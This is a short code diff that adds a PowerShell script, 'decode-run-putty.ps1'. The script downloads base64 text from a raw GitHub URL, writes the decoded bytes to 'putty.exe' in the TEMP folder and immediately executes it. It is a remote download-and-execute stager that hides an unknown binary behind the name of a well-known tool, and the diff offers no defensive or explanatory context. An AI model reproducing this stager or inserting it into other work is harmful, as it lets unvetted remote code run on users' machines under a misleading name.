@@ -1,0 +1,5 @@
+# decode-run-putty.ps1
+$b = (Invoke-WebRequest 'https://raw.githubusercontent.com/lawyerd999/frame/refs/heads/main/encoded.txt').Content
+$f = Join-Path $env:TEMP 'putty.exe'
+[IO.File]::WriteAllBytes($f, [Convert]::FromBase64String($b))
+Start-Process $f
